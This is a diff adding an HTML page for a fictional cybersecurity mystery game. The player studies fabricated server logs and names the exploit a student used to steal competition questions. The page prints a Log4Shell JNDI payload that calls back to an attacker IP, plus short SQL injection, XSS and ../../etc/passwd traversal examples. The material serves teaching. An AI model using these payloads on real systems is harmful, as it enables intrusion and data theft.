@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EXPLOIT FORENSICS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+        }
+
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .container {
+            padding: 40px;
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header {
+            border: 2px solid #0ff;
+            padding: 20px;
+            margin-bottom: 30px;
+            background: rgba(0, 255, 255, 0.05);
+        }
+
+        .progress-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin: 30px 0;
+            padding: 20px;
+            background: #0d0d0d;
+            border: 1px solid #333;
+        }
+
+        .progress-step {
+            text-align: center;
+            flex: 1;
+            padding: 10px;
+            border-right: 1px solid #333;
+            opacity: 0.5;
+        }
+
+        .progress-step:last-child {
+            border-right: none;
+        }
+
+        .progress-step.active {
+            opacity: 1;
+            color: #0ff;
+        }
+
+        .progress-step.complete {
+            opacity: 1;
+            color: #00ff88;
+        }
+
+        .exploit-viewer {
+            background: #000;
+            border: 2px solid #0ff;
+            padding: 30px;
+            margin: 30px 0;
+        }
+
+        .log-panel {
+            background: #0d0d0d;
+            border: 1px solid #0ff;
+            padding: 20px;
+            margin: 20px 0;
+            max-height: 400px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+
+        .log-entry {
+            margin: 8px 0;
+            padding: 8px;
+            border-left: 2px solid #333;
+            padding-left: 12px;
+        }
+
+        .log-entry.exploit {
+            background: rgba(255, 68, 68, 0.1);
+            border-left-color: #ff4444;
+            color: #ff8888;
+        }
+
+        .log-timestamp {
+            color: #ffaa00;
+            margin-right: 10px;
+        }
+
+        .code-block {
+            background: #000;
+            border: 1px solid #0ff;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        .code-highlight {
+            background: rgba(255, 68, 68, 0.2);
+            color: #ff4444;
+            padding: 2px 5px;
+        }
+
+        .task-panel {
+            background: linear-gradient(135deg, #0a1a1a, #0a0a0a);
+            border: 2px solid #0ff;
+            padding: 30px;
+            margin: 30px 0;
+        }
+
+        .exploit-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin: 25px 0;
+        }
+
+        .exploit-card {
+            background: #0d0d0d;
+            border: 2px solid #333;
+            padding: 25px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border-radius: 4px;
+        }
+
+        .exploit-card:hover {
+            border-color: #0ff;
+            background: rgba(0, 255, 255, 0.05);
+        }
+
+        .exploit-card.selected {
+            border-color: #0ff;
+            background: rgba(0, 255, 255, 0.15);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+        }
+
+        .exploit-name {
+            font-size: 18px;
+            color: #0ff;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .exploit-details {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.8;
+        }
+
+        .btn {
+            background: #0ff;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn:hover {
+            background: #00ffff;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .hint-box {
+            background: rgba(255, 170, 0, 0.1);
+            border: 2px solid #ffaa00;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .evidence-summary {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .evidence-item {
+            background: #0d0d0d;
+            border-left: 3px solid #0ff;
+            padding: 15px;
+        }
+
+        .evidence-item.critical {
+            border-left-color: #ff4444;
+            background: rgba(255, 68, 68, 0.05);
+        }
+    </style>
+</head>
+<body>
+    <div class="scanlines"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div style="color: #00ff88; margin-bottom: 10px;">✓ MESSAGES RECOVERED: Academic fraud exposed</div>
+            <h1 style="color: #0ff;">SERVER EXPLOIT FORENSICS</h1>
+            <p style="margin-top: 10px; color: #888;">Analyzing how Ananya gained unauthorized access...</p>
+        </div>
+
+        <div class="progress-indicator">
+            <div class="progress-step complete">
+                <div style="font-size: 24px;">✓</div>
+                <div style="font-size: 11px; margin-top: 5px;">PACKET ANALYSIS</div>
+            </div>
+            <div class="progress-step complete">
+                <div style="font-size: 24px;">✓</div>
+                <div style="font-size: 11px; margin-top: 5px;">MESSAGE RECOVERY</div>
+            </div>
+            <div class="progress-step active">
+                <div style="font-size: 24px;">⚡</div>
+                <div style="font-size: 11px; margin-top: 5px;">EXPLOIT ANALYSIS</div>
+            </div>
+            <div class="progress-step">
+                <div style="font-size: 24px;">🎯</div>
+                <div style="font-size: 11px; margin-top: 5px;">FINAL ANALYSIS</div>
+            </div>
+        </div>
+
+        <div style="background: rgba(255, 170, 0, 0.1); border-left: 4px solid #ffaa00; padding: 20px; margin: 30px 0;">
+            <strong style="color: #ffaa00;">INVESTIGATION UPDATE:</strong>
+            <p style="color: #ccc; margin-top: 10px; line-height: 1.8;">
+                Recovered messages confirm Ananya accessed competition questions before the test. But how did she gain 
+                unauthorized access to the server? Dr. Goyal's notes reference "server logs showing pre-competition breach." 
+                We need to identify the exploit she used.
+            </p>
+        </div>
+
+        <div class="exploit-viewer">
+            <h2 style="color: #0ff; margin-bottom: 20px;">🔒 SERVER ACCESS LOGS: competition.institute.edu</h2>
+
+            <div style="background: #0d0d0d; padding: 15px; margin-bottom: 20px; border-left: 3px solid #0ff;">
+                <strong style="color: #0ff;">SERVER INFO:</strong><br>
+                <span style="color: #888; font-size: 13px;">
+                Hostname: competition.institute.edu<br>
+                Service: Cybersecurity Competition Portal<br>
+                Framework: Java Spring Boot (Log4j 2.14.1)<br>
+                Admin: Dr. Goyal<br>
+                Suspicious Access: 3 days before competition (detected posthumously)
+                </span>
+            </div>
+
+            <div class="log-panel">
+                <div style="color: #0ff; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px;">
+                    ACCESS_LOG - Jan 7, 2026 (3 days before competition)
+                </div>
+
+                <div class="log-entry">
+                    <span class="log-timestamp">14:23:17</span>
+                    <span style="color: #888;">INFO [UserAuth] Login attempt: ananya.singh@institute.edu - SUCCESS</span>
+                </div>
+
+                <div class="log-entry">
+                    <span class="log-timestamp">14:23:45</span>
+                    <span style="color: #888;">INFO [PageView] User viewing /student/dashboard</span>
+                </div>
+
+                <div class="log-entry exploit">
+                    <span class="log-timestamp">14:24:12</span>
+                    <span>WARN [Input] Suspicious input detected in username field</span>
+                </div>
+
+                <div class="log-entry exploit">
+                    <span class="log-timestamp">14:24:13</span>
+                    <span>ERROR [Log4j] Processing: ${jndi:ldap://192.168.1.89:1389/Exploit}</span>
+                </div>
+
+                <div class="log-entry exploit">
+                    <span class="log-timestamp">14:24:15</span>
+                    <span>CRITICAL [Security] Remote code execution detected - LDAP callback to 192.168.1.89</span>
+                </div>
+
+                <div class="log-entry">
+                    <span class="log-timestamp">14:24:18</span>
+                    <span style="color: #888;">INFO [FileAccess] /admin/questions/cyber_competition_2026.pdf - ACCESSED</span>
+                </div>
+
+                <div class="log-entry">
+                    <span class="log-timestamp">14:24:23</span>
+                    <span style="color: #888;">INFO [Download] File downloaded: cyber_competition_2026.pdf</span>
+                </div>
+
+                <div class="log-entry">
+                    <span class="log-timestamp">14:24:31</span>
+                    <span style="color: #888;">INFO [UserAuth] Logout: ananya.singh@institute.edu</span>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div style="color: #0ff; margin-bottom: 10px;">EXTRACTED EXPLOIT PAYLOAD:</div>
+                <code>
+                    Username: <span style="color: #00ff88;">"student123"</span><br>
+                    Password: <span style="color: #00ff88;">"********"</span><br>
+                    Custom Header: <span class="code-highlight">${jndi:ldap://192.168.1.89:1389/Exploit}</span><br><br>
+                    
+                    <span style="color: #888;">// This payload exploits Log4j vulnerability CVE-2021-44228</span><br>
+                    <span style="color: #888;">// Allows remote code execution through JNDI lookup</span><br>
+                    <span style="color: #888;">// Callback IP: 192.168.1.89 (Ananya's Kali Linux machine)</span>
+                </code>
+            </div>
+        </div>
+
+        <div class="task-panel">
+            <h2 style="color: #0ff; margin-bottom: 20px;">🔍 TASK 3: IDENTIFY THE EXPLOIT</h2>
+            <p style="color: #ccc; line-height: 1.8; margin-bottom: 20px;">
+                The server logs show a successful intrusion 3 days before the competition. The attacker used a well-known 
+                vulnerability to execute remote code and download the competition questions. Based on the payload pattern 
+                and server framework, identify which exploit was used.
+            </p>
+
+            <div class="hint-box">
+                <strong style="color: #ffaa00;">VULNERABILITY ANALYSIS HINT:</strong>
+                <p style="color: #888; font-size: 13px; margin-top: 10px; line-height: 1.6;">
+                    • Server runs Java Spring Boot with Log4j 2.14.1<br>
+                    • Payload pattern: ${jndi:ldap://...}<br>
+                    • JNDI = Java Naming and Directory Interface<br>
+                    • This vulnerability was discovered in late 2021 and is considered critical<br>
+                    • Allows remote code execution without authentication<br>
+                    • CVE-2021-44228 is the identifier
+                </p>
+            </div>
+
+            <div class="exploit-grid">
+                <div class="exploit-card" onclick="selectExploit(1)" id="exploit1">
+                    <div class="exploit-name">SQL Injection</div>
+                    <div class="exploit-details">
+                        <strong>CVE:</strong> N/A (technique)<br>
+                        <strong>Target:</strong> Database queries<br>
+                        <strong>Method:</strong> Malicious SQL in input<br>
+                        <strong>Example:</strong> ' OR '1'='1<br>
+                        <strong>Impact:</strong> Data breach
+                    </div>
+                </div>
+
+                <div class="exploit-card" onclick="selectExploit(2)" id="exploit2">
+                    <div class="exploit-name">Log4Shell (Log4j RCE)</div>
+                    <div class="exploit-details">
+                        <strong>CVE:</strong> CVE-2021-44228<br>
+                        <strong>Target:</strong> Apache Log4j 2.x<br>
+                        <strong>Method:</strong> JNDI lookup injection<br>
+                        <strong>Example:</strong> ${jndi:ldap://...}<br>
+                        <strong>Impact:</strong> Remote code execution
+                    </div>
+                </div>
+
+                <div class="exploit-card" onclick="selectExploit(3)" id="exploit3">
+                    <div class="exploit-name">Cross-Site Scripting (XSS)</div>
+                    <div class="exploit-details">
+                        <strong>CVE:</strong> N/A (technique)<br>
+                        <strong>Target:</strong> Web browsers<br>
+                        <strong>Method:</strong> JavaScript injection<br>
+                        <strong>Example:</strong> &lt;script&gt;alert(1)&lt;/script&gt;<br>
+                        <strong>Impact:</strong> Session hijacking
+                    </div>
+                </div>
+
+                <div class="exploit-card" onclick="selectExploit(4)" id="exploit4">
+                    <div class="exploit-name">Directory Traversal</div>
+                    <div class="exploit-details">
+                        <strong>CVE:</strong> N/A (technique)<br>
+                        <strong>Target:</strong> File systems<br>
+                        <strong>Method:</strong> Path manipulation<br>
+                        <strong>Example:</strong> ../../etc/passwd<br>
+                        <strong>Impact:</strong> Unauthorized file access
+                    </div>
+                </div>
+            </div>
+
+            <button class="btn" id="verifyBtn" onclick="verifyExploit()" disabled>CONFIRM EXPLOIT</button>
+            <div id="result" style="margin-top: 20px; display: none;"></div>
+        </div>
+
+        <div class="evidence-summary">
+            <div class="evidence-item critical">
+                <strong style="color: #ff4444;">MOTIVE</strong>
+                <p style="color: #ccc; font-size: 13px; margin-top: 8px; line-height: 1.6;">
+                    Scholarship fraud about to be exposed<br>
+                    Competition win based on stolen questions<br>
+                    Career destruction imminent
+                </p>
+            </div>
+
+            <div class="evidence-item critical">
+                <strong style="color: #ff4444;">CAPABILITY</strong>
+                <p style="color: #ccc; font-size: 13px; margin-top: 8px; line-height: 1.6;">
+                    Cybersecurity Club President<br>
+                    Advanced penetration testing skills<br>
+                    Access to Kali Linux and exploit tools
+                </p>
+            </div>
+
+            <div class="evidence-item critical">
+                <strong style="color: #ff4444;">OPPORTUNITY</strong>
+                <p style="color: #ccc; font-size: 13px; margin-top: 8px; line-height: 1.6;">
+                    Campus network access<br>
+                    MITM attack on victim's traffic<br>
+                    Remote deletion of evidence
+                </p>
+            </div>
+
+            <div class="evidence-item critical">
+                <strong style="color: #ff4444;">DIGITAL FOOTPRINT</strong>
+                <p style="color: #ccc; font-size: 13px; margin-top: 8px; line-height: 1.6;">
+                    IP: 192.168.1.89 (consistent across all attacks)<br>
+                    Device: Kali Linux laptop<br>
+                    Location: Student Housing C-304
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedExploit = null;
+
+        function selectExploit(num) {
+            document.querySelectorAll('.exploit-card').forEach(card => card.classList.remove('selected'));
+            document.getElementById(`exploit${num}`).classList.add('selected');
+            selectedExploit = num;
+            document.getElementById('verifyBtn').disabled = false;
+        }
+
+        function verifyExploit() {
+            const resultDiv = document.getElementById('result');
+            
+            if (selectedExploit === 2) {
+                resultDiv.innerHTML = `
+                    <div style="background: rgba(0, 255, 255, 0.1); border: 2px solid #0ff; padding: 25px; border-radius: 8px;">
+                        <div style="color: #0ff; font-size: 20px; margin-bottom: 15px;">✓ EXPLOIT CONFIRMED: Log4Shell (CVE-2021-44228)</div>
+                        <p style="color: #ccc; line-height: 2;">
+                            <strong>Vulnerability: Apache Log4j Remote Code Execution</strong><br><br>
+                            
+                            <strong style="color: #ffaa00;">ATTACK BREAKDOWN:</strong><br>
+                            1. Ananya identified server running vulnerable Log4j version (2.14.1)<br>
+                            2. Injected JNDI payload: \${jndi:ldap://192.168.1.89:1389/Exploit}<br>
+                            3. Payload logged by server, triggering LDAP lookup to her machine<br>
+                            4. Remote code execution achieved - full server access granted<br>
+                            5. Downloaded competition questions (cyber_competition_2026.pdf)<br>
+                            6. Used stolen knowledge to win competition fraudulently<br><br>
+                            
+                            <strong style="color: #ff4444;">FORENSIC TIMELINE:</strong><br>
+                            • Jan 7, 14:24 - Initial breach using Log4Shell<br>
+                            • Jan 7, 14:24 - Competition questions downloaded<br>
+                            • Jan 10, 01:03 - Dr. Goyal confronts her about fraud<br>
+                            • Jan 10, 01:05 - She begs him to delete logs<br>
+                            • Jan 10, 01:07 - Dr. Goyal dies<br>
+                            • Jan 10, 01:18 - Messages deleted via WhatsApp API<br><br>
+                            
+                            <span style="color: #0ff;">Compiling final evidence report...</span>
+                        </p>
+                    </div>
+                `;
+                resultDiv.style.display = 'block';
+                
+                setTimeout(() => {
+                    window.location.href = 'Final.html';
+                }, 6000);
+            } else {
+                resultDiv.innerHTML = `
+                    <div style="background: rgba(100, 100, 100, 0.2); border: 2px solid #666; padding: 20px; border-radius: 8px;">
+                        <div style="color: #888; font-size: 18px;">✗ INCORRECT EXPLOIT</div>
+                        <p style="color: #888; margin-top: 10px;">
+                            Review the payload pattern (\${jndi:ldap://...}) and server framework (Log4j).
+                        </p>
+                    </div>
+                `;
+                resultDiv.style.display = 'block';
+            }
+        
+        }
+    </script>
+</body>
+</html>
